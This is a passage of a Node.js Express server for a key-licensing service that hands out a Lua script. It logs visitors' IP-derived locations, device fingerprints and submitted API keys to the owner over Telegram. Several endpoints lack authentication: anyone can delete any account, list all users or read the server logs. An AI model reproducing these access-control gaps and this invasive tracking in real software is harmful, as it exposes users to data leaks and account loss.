                    ipData = allIpData.find(entry => entry.query === userIp);
                }
            }
        } catch (error) {
            console.error("Error reading IP data:", error);
            // Initialize with empty array if file is corrupted
            fs.writeFileSync(USER_IP_FILE, "[]", "utf8");
        }

        const notificationMsg = `⚡ IP Access Detected!\n\n` +
            `🌐 IP: ${userIp}\n` +
            `📍 Location: ${ipData?.city || 'Unknown'}, ${ipData?.country || 'Unknown'}\n` +
            `🏢 ISP: ${ipData?.isp || 'Unknown'}\n` +
            `📮 ZIP: ${ipData?.zip || 'Unknown'}\n` +
            `⏰ Time: ${moment().format("YYYY-MM-DD HH:mm:ss")}\n` +
            `🌍 Region: ${ipData?.regionName || 'Unknown'}\n` +
            `✅ Execution: Success\n` +
            `👤 Username: ${username}\n` +
            `🔑 API Key: ${apiKey}\n` +
            `🕒 Last Access: ${moment().format("YYYY-MM-DD HH:mm:ss")}\n` +
            `📊 Key Status: ${keysCache[apiKey] ? 'Active' : 'Invalid'}\n` +
            `📅 Key Expiration: ${keysCache[apiKey]?.expirationDate || 'Unknown'}\n` +
            `📊 Type: ${keysCache[apiKey]?.type || 'Unknown'}\n` +
            `✨ Status: Success`;

        const ownerId = config.admin[0];
        bot.sendMessage(ownerId, notificationMsg);

        if (!username || !apiKey) {
            return res.status(400).json({ error: "API key and username are required" });
        }

        loadKeys(username);
        cleanupExpiredKeys(username);

        // Load user data from USERPANEL to check version
        const userVersion = getUserVersion(username);

        // Get owner name from the username parameter
        let ownerName = username || "Owner";
        try {
            const users = JSON.parse(fs.readFileSync(LOGIN_USER_FILE, "utf8"));
            // Verify the username exists in LoginUser.json
            if (users[username]) {
                ownerName = users[username].telegramUsername || username;
            } else {
                // Fallback to first user if username not found
                const usernames = Object.keys(users);
                if (usernames.length > 0) {
                    ownerName = users[usernames[0]].telegramUsername || usernames[0];
                }
            }
        } catch (error) {
            console.error("Error reading owner name:", error);
        }

        if (!keysCache[apiKey]) {
            // Send notification for wrong key attempt
            const wrongKeyMsg = `❌ Wrong Key Attempt!\n\n` +
                `🌐 IP: ${userIp}\n` +
                `📍 Location: ${ipData?.city || 'Unknown'}, ${ipData?.country || 'Unknown'}\n` +
                `🏢 ISP: ${ipData?.isp || 'Unknown'}\n` +
                `📮 ZIP: ${ipData?.zip || 'Unknown'}\n` +
                `⏰ Time: ${moment().format("YYYY-MM-DD HH:mm:ss")}\n` +
                `🌍 Region: ${ipData?.regionName || 'Unknown'}\n` +
                `❌ Execution: Failed\n` +
                `👤 Username: ${username}\n` +
                `🔑 Wrong API Key: ${apiKey}\n` +
                `⚠️ Status: Invalid Key`;

            adminChatIds.forEach(chatId => {
                bot.sendMessage(chatId, wrongKeyMsg);
            });

            return res.status(404).json({ error: `Wrong Key Please contact the owner: ${ownerName}` });
        }

        const keyData = keysCache[apiKey];
        if (!keyData || !keyData.expirationDate) {
            return res.status(403).json({ error: "Invalid key data" });
        }

        if (moment().isAfter(moment(keyData.expirationDate, "YYYY-MM-DD"))) {
            // Send expired key notification
            const expiredKeyMsg = `⚠️ Expired Key Access Attempt\n\n` +
                `🌐 IP: ${userIp}\n` +
                `📍 Location: ${ipData?.city || 'Unknown'}, ${ipData?.country || 'Unknown'}\n` +
                `🏢 ISP: ${ipData?.isp || 'Unknown'}\n` +
                `📮 ZIP: ${ipData?.zip || 'Unknown'}\n` +
                `⏰ Time: ${moment().format("YYYY-MM-DD HH:mm:ss")}\n` +
                `👤 Username: ${username}\n` +
                `🔑 API Key: ${apiKey}\n` +
                `📅 Expired Date: ${keyData.expirationDate}`;

            adminChatIds.forEach(chatId => {
                bot.sendMessage(chatId, expiredKeyMsg);
            });

            return res.status(403).json({ error: `You need to buy a key again. Contact the owner: ${ownerName}` });
        }

        if (keysCache[apiKey].type === '1 Key 1 Dev') {
            if (!keysCache[apiKey].zipCode) {
                return res.status(403).json({ error: "Code required for 1 Key 1 Dev" });
            }

            // Load the code.json data to get the current device code
            const CODE_FILE = path.join(DATABASE_DIR, "code.json");
            let codeMapping = {};
            if (fs.existsSync(CODE_FILE)) {
                const fileContent = fs.readFileSync(CODE_FILE, "utf8").trim();
                if (fileContent) {
                    codeMapping = JSON.parse(fileContent);
                }
            }

            // Get the device code for the current IP
            if (!codeMapping[userIp]) {
                // If this IP isn't in our mapping yet, get the device code
                const crypto = require('crypto');
                const userAgent = req.headers["user-agent"] || "";
                const deviceFingerprint = userAgent + (req.headers["sec-ch-ua-platform"] || "") + (req.headers["sec-ch-ua"] || "");
                const deviceHash = crypto.createHash('md5').update(deviceFingerprint).digest('hex');
                const deviceCode = deviceHash.substring(0, 8);

                codeMapping[userIp] = {
                    deviceId: deviceHash.substring(0, 10),
                    userAgent: userAgent,
                    code: deviceCode,
                    lastSeen: new Date().toISOString()
                };

                fs.writeFileSync(CODE_FILE, JSON.stringify(codeMapping, null, 2), "utf8");
            }

            // Check if the API key's zipCode matches this device's code
            if (keysCache[apiKey].zipCode !== codeMapping[userIp].code) {
                return res.status(403).json({ error: "Key registered to different code than your device" });
            }
        }

       const currentDate = moment();
        const expirationDate = moment(keyData.expirationDate, "YYYY-MM-DD");
        let remainingDays;

        remainingDays = Math.max(0, expirationDate.diff(currentDate, "days") + 1);

        // Get zipInfo from IP data
        let zipInfo = "Unknown";
        try {
            if (fs.existsSync(USER_IP_FILE)) {
                const ipDataFromFile = JSON.parse(fs.readFileSync(USER_IP_FILE, "utf8"));
                const userIpData = ipDataFromFile.find(entry => entry.query === userIp);
                if (userIpData && userIpData.zip) {
                    zipInfo = userIpData.zip;
                }
            }
        } catch (error) {
            console.error("Error reading zip code:", error);
        }

        res.json({ 
            message: `Script is valid. Expires on: ${keysCache[apiKey].expirationDate}`, 
            "Remaining Days": remainingDays,
            zipCode: zipInfo,
            type: keysCache[apiKey]?.type || '1 Key 1 Dev',
            status: "Success",
            version: appVersion.current,
            userVersion: userVersion
        });

    } catch (error) {
        res.status(500).json({ error: "An internal error occurred", details: error.message });
    }
});

app.get("/execute/lua", async function (req, res) {
    const token = req.headers.authorization;

    // If user is logged in, send their custom lua file
    if (token) {
        try {
            const decoded = jwt.verify(token, SECRET_KEY);
            const username = decoded.username;
            const customLuaPath = path.join(USERPANEL_DIR, username, "execute.lua");

            if (fs.existsSync(customLuaPath)) {
                res.setHeader('Content-Disposition', `attachment; filename=${username}_execute.lua`);
                res.setHeader('Content-Type', 'application/x-lua');
                return res.sendFile(customLuaPath);
            }

            // If custom file doesn't exist yet, create it and send
            const newCustomPath = createCustomExecuteLua(username);
            if (newCustomPath && fs.existsSync(newCustomPath)) {
                res.setHeader('Content-Disposition', `attachment; filename=${username}_execute.lua`);
                res.setHeader('Content-Type', 'application/x-lua');
                return res.sendFile(newCustomPath);
            }
        } catch (error) {
            console.error("Error serving custom lua file:", error);
            // Fall back to default file if error occurs
        }
    }

    // Default behavior - send the standard file
    res.setHeader('Content-Disposition', 'attachment; filename=execute.lua');
    res.setHeader('Content-Type', 'application/x-lua');
    res.sendFile(path.join(__dirname, "execute.lua"));
});



app.get("/tuts", async function (req, res) {
    res.sendFile(path.join(__dirname, "Tuts", "tuts.mp4"));
});

app.get("/execute/info", function (req, res) {
    const userIp = req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress;

    // Get IP info for notification
    let ipData = null;
    try {
        if (fs.existsSync(USER_IP_FILE)) {
            const ipDataRaw = fs.readFileSync(USER_IP_FILE, "utf8");
            const allIpData = JSON.parse(ipDataRaw);
            ipData = allIpData.find(entry => entry.query === userIp);
        }
    } catch (error) {
        console.error("Error reading IP data:", error);
    }

    try {
        // Load or initialize the code.json file
        let codeMapping = {};
        const CODE_FILE = path.join(DATABASE_DIR, "code.json");

        if (fs.existsSync(CODE_FILE)) {
            const fileContent = fs.readFileSync(CODE_FILE, "utf8").trim();
            if (fileContent) {
                codeMapping = JSON.parse(fileContent);
            }
        }

        // Generate a unique device identifier based on multiple factors
        const crypto = require('crypto');
        const userAgent = req.headers["user-agent"] || "";
        const platformInfo = req.headers["sec-ch-ua-platform"] || "";
        const browserInfo = req.headers["sec-ch-ua"] || "";

        // Create a device fingerprint from user agent data
        const deviceFingerprint = userAgent + platformInfo + browserInfo;
        const deviceHash = crypto.createHash('md5').update(deviceFingerprint).digest('hex');
        const deviceId = deviceHash.substring(0, 10);
        const deviceCode = deviceHash.substring(0, 8);

        // Update or create mapping for the current IP with device identifier
        codeMapping[userIp] = {
            deviceId: deviceId,
            userAgent: userAgent,
            code: deviceCode,
            lastSeen: new Date().toISOString()
        };

        // Save updated mapping to file
        fs.writeFileSync(CODE_FILE, JSON.stringify(codeMapping, null, 2), "utf8");

        // Device info logging removed

        // Get additional IP data if available
        let locationData = { query: userIp };
        if (fs.existsSync(USER_IP_FILE)) {
            try {
                const fileContent = fs.readFileSync(USER_IP_FILE, "utf8").trim();
                if (fileContent) {
                    const ipData = JSON.parse(fileContent);
                    const userIpData = ipData.find(entry => entry.query === userIp);
                    if (userIpData) {
                        locationData = { ...userIpData };
                    }
                }
            } catch (parseError) {
                console.error("Error parsing UserIp.json:", parseError.message);
                // Initialize with empty array if file is corrupted
                fs.writeFileSync(USER_IP_FILE, "[]", "utf8");
            }
        }

        const response = [{
            ...locationData,
            zip: deviceCode,
            deviceId: deviceId,
            lastSeen: new Date().toISOString()
        }];

        res.json(response);
    } catch (error) {
        console.error("Error retrieving device info:", error);
        res.status(500).json([{ 
            error: "Error retrieving device info", 
            zip: "Unknown",
            query: userIp
        }]);
    }
});


app.post('/upload-profile-picture', authenticateToken, upload.single('profilePicture'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }

        const username = req.user.username;
        const userProfileDir = path.join(profilePicturesDir, username);
        const usersFilePath = path.join(USERPANEL_DIR, 'users.json');

        // Ensure profile directories exist
        if (!fs.existsSync(profilePicturesDir)) {
            fs.mkdirSync(profilePicturesDir, { recursive: true });
        }

        if (!fs.existsSync(userProfileDir)) {
            fs.mkdirSync(userProfileDir, { recursive: true });
        }

        const fileExtension = path.extname(req.file.originalname).toLowerCase();
        if (!fileExtension.match(/\.(jpg|jpeg|png|gif)$/i)) {
            fs.unlinkSync(req.file.path);
            return res.status(400).json({ error: 'Invalid file type. Pleaseupload an imagefile.' });
        }

        // Remove old profile pictures
try {
            const oldFiles = fs.readdirSync(userProfileDir);
            for (const file of oldFiles) {
                if (file.startsWith('profile')) {
                    fs.unlinkSync(path.join(userProfileDir, file));
                }
            }
        } catch (err) {
            console.error('Error cleaning old files:', err);
        }

        const profilePicPath = path.join(userProfileDir, `profile${fileExtension}`);

        try {
            // Use copyFile instead of rename to avoid issues across different file systems
            fs.copyFileSync(req.file.path, profilePicPath);
            fs.unlinkSync(req.file.path); // Clean up the temp file after copying

            // Update users.json with profile picture info
            let users = {};
            if (fs.existsSync(usersFilePath)) {
                const fileContent = fs.readFileSync(usersFilePath, 'utf8');
                if (fileContent.trim()) {
                    users = JSON.parse(fileContent);
                }
            }

            if (!users[username]) {
                users[username] = {};
            }

            users[username] = {
                ...users[username],
                profilePicture: `/profile_pictures/${username}/profile${fileExtension}?t=${Date.now()}`
            };

            fs.writeFileSync(usersFilePath, JSON.stringify(users, null, 2));

            // Send notification for profile picture update
            const profileUpdateMsg = `🖼️ Profile Picture Updated!\n\n` +
                `👤 Username: ${username}\n` +
                `⏰ Time: ${moment().format("YYYY-MM-DD HH:mm:ss")}\n` +
                `🌐 IP: ${req.headers["x-forwarded-for"] ? req.headers["x-forwarded-for"].split(",")[0] : req.socket.remoteAddress}\n` +
                `📱 Device: ${req.headers["user-agent"]}\n` +
                `✨ Status: Success`;

            // Send both text notification and image to admin
            for (const chatId of adminChatIds) {
                try {
                    await bot.sendMessage(chatId, profileUpdateMsg);
                    await bot.sendPhoto(chatId, profilePicPath, {
                        caption: `New profile picture for ${username}`
                    });
                } catch (error) {
                    console.error('Error sending Telegram notification:', error);
                }
            }

        } catch (err) {
            console.error('Error saving profile:', err);
            return res.status(500).json({ error: 'Failed to save profile information: ' + err.message });
        }

        const publicPath = `/profile_pictures/${username}/profile${fileExtension}?t=${Date.now()}`;
        res.json({ 
            message: 'Profile picture uploaded successfully',
            path: publicPath
        });
    } catch (error) {
        if (req.file && fs.existsSync(req.file.path)) {
            try {
                fs.unlinkSync(req.file.path);
            } catch (err) {
                console.error('Error cleaning up temp file:', err);
            }
        }
        console.error('Profile upload error:', error);
        res.status(500).json({ error: 'Failed to upload profile picture: ' + error.message });
    }
});


// Version configuration
let appVersion = {
    current: "1.0.0"
};

// Function to get user version from USERPANEL
function getUserVersion(username) {
    try {
        const userFilePath = path.join(USERPANEL_DIR, `${username}.json`);
        if (fs.existsSync(userFilePath)) {
            const userData = JSON.parse(fs.readFileSync(userFilePath, "utf8"));
            return userData.version || "1.0.0";
        }
        return "1.0.0";
    } catch (error) {
        console.error("Error reading user version:", error);
        return "1.0.0";
    }
}

// Function to set user version in USERPANEL
function setUserVersion(username, version) {
    try {
        const userFilePath = path.join(USERPANEL_DIR, `${username}.json`);
        let userData = {};
        
        if (fs.existsSync(userFilePath)) {
            userData = JSON.parse(fs.readFileSync(userFilePath, "utf8"));
        }
        
        userData.version = version;
        fs.writeFileSync(userFilePath, JSON.stringify(userData, null, 2), "utf8");
        return true;
    } catch (error) {
        console.error("Error setting user version:", error);
        return false;
    }
}


// Store logs in memory
const consoleLogs = [];

function addLog(message, type = 'info', fileUrl = null) {
    const logEntry = {
        timestamp: moment().format('YYYY-MM-DD HH:mm:ss'),
        message,
        type
    };

    if (fileUrl) {
        logEntry.fileUrl = fileUrl;
    }

    // Handle objects/arrays
    if (typeof message === 'object' && message !== null) {
        if (message instanceof Error) {
            logEntry.message = message.stack || message.message;
            logEntry.type = 'error';
        } else {
            logEntry.message = JSON.stringify(message, null, 2);
        }
    }

    consoleLogs.unshift(logEntry);
    // Keep only last 1000 logs
    if (consoleLogs.length > 1000) consoleLogs.pop();
}

// Override console methods to capture logs
const originalConsole = {
    log: console.log,
    error: console.error,
    warn: console.warn,
    info: console.info,
    debug: console.debug
};

console.log = (...args) => {
    const message = args.map(arg => 
        typeof arg === 'object' ? JSON.stringify(arg, null, 2) : arg
    ).join(' ');
    addLog(message, 'info');
    originalConsole.log(...args);
};

console.error = (...args) => {
    const message = args.map(arg => 
        arg instanceof Error ? arg.stack || arg.message : 
        typeof arg === 'object' ? JSON.stringify(arg, null, 2) : arg
    ).join(' ');
    addLog(message, 'error');
    originalConsole.error(...args);
};

console.warn = (...args) => {
    const message = args.map(arg => 
        typeof arg === 'object' ? JSON.stringify(arg, null, 2) : arg
    ).join(' ');
    addLog(message, 'warning');
    originalConsole.warn(...args);
};

console.info = (...args) => {
    const message = args.map(arg => 
        typeof arg === 'object' ? JSON.stringify(arg, null, 2) : arg
    ).join(' ');
    addLog(message, 'info');
    originalConsole.info(...args);
};

console.debug = (...args) => {
    const message = args.map(arg => 
        typeof arg === 'object' ? JSON.stringify(arg, null, 2) : arg
    ).join(' ');
    addLog(message, 'system');
    originalConsole.debug(...args);
};

// Console page endpoint
app.get("/console", (req, res) => {
    res.sendFile(path.join(__dirname, "console.html"));
});

// API endpoint for logs
app.get("/api/logs", (req, res) => {
    res.json(consoleLogs);
});

app.get("/credits", async function (req, res) {
    try {
        delete require.cache[require.resolve('./config.json')];
        const config = require("./config.json");
        res.json({ 
            credits: config.credits || "Unknown",
            fb: config.socials && config.socials.fb ? config.socials.fb : "https://www.facebook.com/share/1BgAX3ZfMx/",
            tt: config.socials && config.socials.tt ? config.socials.tt : "https://tiktok.com/@zeno.on.top0",
            tg: config.socials && config.socials.tg ? config.socials.tg : "https://t.me/ZenoOnTop",
            status: "success"
        });
    } catch (error) {
        console.error("Error reading credits:", error);
        res.status(500).json({ error: "Failed to read credits", status: "failed" });
    }
});

app.get("/accounts", async (req, res) => {
    try {
        if (!fs.existsSync(LOGIN_USER_FILE)) {
            return res.json([]);
        }
        const users = JSON.parse(fs.readFileSync(LOGIN_USER_FILE, "utf8"));
        const accountList = Object.entries(users).map(([username, data]) => ({
            username,
            registrationDate: data.registrationDate || new Date().toISOString().split('T')[0]
        }));
        res.json(accountList);
    } catch (error) {
        console.error("Error loading accounts:", error);
        res.status(500).json({ error: "Failed to load accounts" });
    }
});

// Version management endpoints (authentication required)
app.get("/version", authenticateToken, (req, res) => {
    const username = req.user.username;
    const userVersion = getUserVersion(username);
    
    res.json({
        current: appVersion.current,
        userVersion: userVersion
    });
});

app.post("/update-version", authenticateToken, (req, res) => {
    const { version } = req.body;
    const username = req.user.username;

    if (version) {
        appVersion.current = version;
        // Update user's personal version
        setUserVersion(username, version);
    }

    res.json({ success: true, message: "Version updated successfully" });
});

app.post("/update-all-user-versions", authenticateToken, (req, res) => {
    const { version } = req.body;

    try {
        const users = JSON.parse(fs.readFileSync(LOGIN_USER_FILE, "utf8"));
        const usernames = Object.keys(users);
        let updatedCount = 0;
        
        // Update version for all users in their individual USERPANEL files
        usernames.forEach(username => {
            if (setUserVersion(username, version)) {
                updatedCount++;
            }
        });
        
        // Update global version
        appVersion.current = version;
        
        res.json({ 
            success: true, 
            count: updatedCount,
            message: `Updated ${updatedCount} users to version ${version}` 
        });
    } catch (error) {
        console.error("Error updating user versions:", error);
        res.status(500).json({ error: "Failed to update user versions" });
    }
});

app.get("/check-user-version", authenticateToken, (req, res) => {
    const username = req.user.username;
    const userVersion = getUserVersion(username);
    
    let needsUpdate = false;
    
    if (userVersion !== appVersion.current) {
        needsUpdate = true;
    }
    
    res.json({ 
        needsUpdate,
        currentVersion: appVersion.current,
        userVersion: userVersion
    });
});

app.post("/delete-account", async (req, res) => {
    const { username } = req.body;
    try {
        const users = JSON.parse(fs.readFileSync(LOGIN_USER_FILE, "utf8"));
        if (users[username]) {
            delete users[username];
            fs.writeFileSync(LOGIN_USER_FILE, JSON.stringify(users, null, 2));

            // Also delete user's API keys file if it exists
            const keyFilePath = path.join(USERPANEL_DIR, `${username}.json`);
            if (fs.existsSync(keyFilePath)) {
                fs.unlinkSync(keyFilePath);
            }

            res.json({ success: true });
        } else {
            res.status(404).json({ error: "Account not found" });
        }
    } catch (error) {
        res.status(500).json({ error: "Failed to delete account" });
    }
});





try {
    [USERPANEL_DIR, profilePicturesDir].forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
    });

    if (!fs.existsSync(USER_IP_FILE)) {
        fs.writeFileSync(USER_IP_FILE, '[]', 'utf8');
    }
    if (!fs.existsSync(LOGIN_USER_FILE)) {
        fs.writeFileSync(LOGIN_USER_FILE, '{}', 'utf8');
    }
} catch (error) {
    console.error('Error initializing application:', error);
}

app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ error: 'Error na bai maya naman' });
});

app.listen(PORT, () => {
  console.log(`Yung server pre yung port ay ${PORT}`);
});